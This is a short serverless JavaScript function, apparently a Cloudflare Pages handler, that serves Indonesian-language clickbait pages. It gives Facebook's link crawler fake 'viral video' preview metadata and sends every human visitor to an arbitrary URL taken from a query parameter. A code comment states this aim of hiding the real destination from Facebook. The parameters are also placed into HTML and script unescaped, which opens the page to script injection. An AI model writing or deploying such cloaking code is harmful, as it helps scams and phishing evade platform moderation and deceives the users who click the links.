export async function onRequest(context) {
  const { searchParams } = new URL(context.request.url);
  
  const title = searchParams.get('t') || "Video Viral Terbaru";
  const image = searchParams.get('i') || "";
  const domain = searchParams.get('dom') || "CONTACTDATING.BIO";
  const target = searchParams.get('url') || "https://google.com";

  const html = `
    <!DOCTYPE html>
    <html lang="id">
    <head>
      <meta charset="UTF-8">
      <title>${title}</title>
      
      <meta property="og:title" content="${title}">
      <meta property="og:description" content="Klik untuk menonton video selengkapnya...">
      <meta property="og:image" content="${image}">
      <meta property="og:site_name" content="${domain}">
      
      <meta property="og:type" content="video.other">
      <meta property="og:video:url" content="${context.request.url}">
      <meta property="og:video:secure_url" content="${context.request.url}">
      <meta property="og:video:type" content="text/html">
      <meta property="og:video:width" content="1280">
      <meta property="og:video:height" content="720">
      
      <meta property="fb:app_id" content="966242223397117">

      <script>
        // Redirect manusia, biarkan bot Facebook melihat meta di atas
        if (!navigator.userAgent.includes('facebookexternalhit')) {
          window.location.href = "${target}";
        }
      </script>
    </head>
    <body>Redirecting to video...</body>
    </html>
  `;

  return new Response(html, {
    headers: { "content-type": "text/html;charset=UTF-8" },
  });
}
